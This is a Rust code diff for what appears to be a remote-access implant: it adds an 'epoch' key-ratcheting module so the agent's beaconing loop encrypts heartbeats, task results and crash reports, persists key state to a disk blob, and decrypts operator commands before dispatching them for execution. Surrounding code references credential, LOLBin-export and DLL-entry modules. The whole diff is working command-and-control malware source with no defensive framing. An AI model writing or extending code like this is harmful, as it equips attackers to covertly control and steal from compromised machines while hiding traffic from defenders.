@@ -8,6 +8,7 @@
 pub mod creds;
 pub mod crypto;
 pub mod crypto_compat;
+pub mod epoch;
 pub mod dynapi;
 pub mod exec;
 pub mod hw;
@@ -72,6 +73,8 @@ const STUN_IP:        &str = env!("STRATUM_STUN_IP");
 const SESSION_KEY_XOR: &str = env!("STRATUM_SESSION_KEY_XOR");
 #[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
 const SESSION_KEY_MASK: &str = env!("STRATUM_XOR_MASK");
+#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
+const PREKEY_POOL_B64: &str = env!("STRATUM_PREKEY_POOL_B64");
 
 // ── DLL entry + LOLBin exports (Windows only) ────────────────────────────────
 
@@ -576,14 +579,50 @@ pub fn agent_loop() {
         let start_cwd = std::env::current_dir()
             .map(|p| p.display().to_string())
             .unwrap_or_default();
+
+        let prekey_pool = epoch::decode_prekey_pool(PREKEY_POOL_B64);
+        let agent_id = epoch::derive_agent_id(&session_key);
+        let epoch_blob = format!("{}.epoch", BLOB_PATH);
+        let mut epoch_state = restore_or_bootstrap_epoch(&epoch_blob, &prekey_pool, &session_key, &agent_id);
+
         #[cfg(all(windows, stratum_debug))]
         unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] run_loop\0".as_ptr()); }
         run_loop(
             &info, &start_cwd, &pub_key, &session_key, &transport, &state,
             FOLDER_PATH, INPUT_FILE, OUTPUT_FILE, HEARTBEAT_FILE,
             BLOB_PATH, WINDOW_START, WINDOW_END,
+            &mut epoch_state, &prekey_pool, &agent_id,
         );
     }
+}
+
+fn restore_or_bootstrap_epoch(
+    epoch_blob: &str,
+    prekey_pool: &[[u8; 32]],
+    session_key: &[u8; 32],
+    agent_id: &[u8],
+) -> epoch::EpochState {
+    if let Some(plain) = hw::read_blob(epoch_blob, "epoch-salt") {
+        if let Some(data) = plain.strip_prefix("STRATUM:") {
+            if let Ok(bytes) = hex::decode(data) {
+                if let Some(st) = epoch::epoch_state_from_bytes(&bytes) {
+                    dlog!("EP", "epoch state restored, epoch={}", st.epoch);
+                    return st;
+                }
+            }
+        }
+    }
+    let prekey = prekey_pool.first().copied().unwrap_or([0u8; 32]);
+    let st = epoch::bootstrap_epoch(&prekey, session_key, agent_id);
+    persist_epoch_state(&st, epoch_blob);
+    dlog!("EP", "epoch state bootstrapped");
+    st
+}
+
+fn persist_epoch_state(state: &epoch::EpochState, epoch_blob: &str) {
+    let bytes = epoch::epoch_state_to_bytes(state);
+    let payload = format!("STRATUM:{}", hex::encode(&bytes));
+    hw::write_blob(epoch_blob, payload.as_bytes(), "epoch-salt");
 }
 
 // ── main loop ─────────────────────────────────────────────────────────────────
@@ -602,6 +641,9 @@ pub(crate) fn run_loop(
     blob:        &str,
     win_start:   &str,
     win_end:     &str,
+    epoch_state: &mut epoch::EpochState,
+    prekey_pool: &[[u8; 32]],
+    agent_id:    &[u8],
 ) {
     #[cfg(stratum_debug)]
     macro_rules! rl_log {
@@ -639,9 +681,11 @@ pub(crate) fn run_loop(
         let next_hb_at = unix_now() + sleep_secs;
         let heartbeat = build_heartbeat(info, start_cwd, &op_cwd, blob, hb_seq, next_hb_at);
         rl_log!("encrypting heartbeat");
-        if let Some(enc) = crypto::encrypt_heartbeat(&heartbeat, pub_key) {
-            rl_log!("uploading heartbeat");
-            transport.upload(&format!("{}{}", folder, hb_f), enc.as_bytes());
+        let epoch_blob_path = format!("{}.epoch", blob);
+        if let Some(enc) = epoch::encrypt_message_v2(epoch_state, heartbeat.as_bytes()) {
+            rl_log!("uploading heartbeat (v2)");
+            transport.upload(&format!("{}{}", folder, hb_f), &enc);
+            persist_epoch_state(epoch_state, &epoch_blob_path);
             rl_log!("heartbeat uploaded");
         } else {
             rl_log!("heartbeat encrypt failed");
@@ -658,21 +702,19 @@ pub(crate) fn run_loop(
 
         if raw == b"MZ" || raw.is_empty() { rl_log!("raw=MZ/empty, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
 
-        rl_log!("parsing raw");
-        let raw_str = match std::str::from_utf8(&raw) {
-            Ok(s)  => s.trim().to_string(),
-            Err(_) => { rl_log!("utf8 err, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
-        };
-
-        rl_log!("raw_str len={} colons={}", raw_str.len(), raw_str.chars().filter(|&c| c == ':').count());
         rl_log!("decrypting command");
-        let task = match crypto::decrypt_command(&raw_str, pub_key, session_key) {
-            Some(t) => t,
+        let prekey = prekey_pool.first().copied().unwrap_or([0u8; 32]);
+        let task = match epoch::decrypt_command_v2(&raw, epoch_state, pub_key, session_key, agent_id, &prekey) {
+            Some(t) => {
+                persist_epoch_state(epoch_state, &epoch_blob_path);
+                t
+            }
             None => {
-                rl_log!("decrypt failed KEY_MISMATCH");
+                rl_log!("decrypt failed");
                 let km = format!("KM:{}", unix_now());
-                if let Some(enc) = crypto::encrypt_heartbeat(&km, pub_key) {
-                    transport.upload(&format!("{}{}", folder, hb_f), enc.as_bytes());
+                if let Some(enc) = epoch::encrypt_message_v2(epoch_state, km.as_bytes()) {
+                    transport.upload(&format!("{}{}", folder, hb_f), &enc);
+                    persist_epoch_state(epoch_state, &epoch_blob_path);
                 }
                 std::thread::sleep(Duration::from_secs(sleep_secs));
                 continue;
@@ -690,6 +732,7 @@ pub(crate) fn run_loop(
         }
 
         rl_log!("task.kind={} task.id={}", task.kind, task.id);
+        *state.epoch_key.lock().unwrap() = Some(epoch_state.epoch_key);
         rl_log!("dispatching task");
         let dispatch_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
             exec::dispatch(&task, state, transport, session_key)
@@ -705,26 +748,29 @@ pub(crate) fn run_loop(
                 };
                 rl_log!("PANIC in dispatch: {}", msg);
                 let err_resp = crate::protocol::TaskResponse::ok(&task, format!("[agent] PANIC: {}", msg));
-                if let Some(enc) = crypto::encrypt_response(&err_resp, pub_key) {
+                let err_json = serde_json::to_string(&err_resp).unwrap_or_default();
+                if let Some(enc) = epoch::encrypt_message_v2(epoch_state, err_json.as_bytes()) {
                     let output_path_full = format!("{}{}", folder, output_f);
-                    transport.upload(&output_path_full, enc.as_bytes());
+                    transport.upload(&output_path_full, &enc);
+                    persist_epoch_state(epoch_state, &epoch_blob_path);
                 }
                 transport.upload(&input_path, b"MZ");
             }
             Ok(Some(resp)) => {
                 rl_log!("dispatch ok, encrypting response");
-                match crypto::encrypt_response(&resp, pub_key) {
+                let resp_json = serde_json::to_string(&resp).unwrap_or_default();
+                match epoch::encrypt_message_v2(epoch_state, resp_json.as_bytes()) {
                     Some(enc) => {
-                        rl_log!("encrypt ok, uploading response");
+                        rl_log!("encrypt ok, uploading response (v2)");
                         let output_path_full = format!("{}{}", folder, output_f);
-                        let enc_bytes = enc.as_bytes();
-                        let mut up = transport.upload(&output_path_full, enc_bytes);
+                        let mut up = transport.upload(&output_path_full, &enc);
                         for attempt in 1..=2 {
                             if up { break; }
                             rl_log!("output upload retry {}", attempt);
                             std::thread::sleep(Duration::from_secs(2 * attempt));
-                            up = transport.upload(&output_path_full, enc_bytes);
+                            up = transport.upload(&output_path_full, &enc);
                         }
+                        persist_epoch_state(epoch_state, &epoch_blob_path);
                         rl_log!("output upload={}", up);
                     }
                     None => { rl_log!("encrypt_response returned None"); }
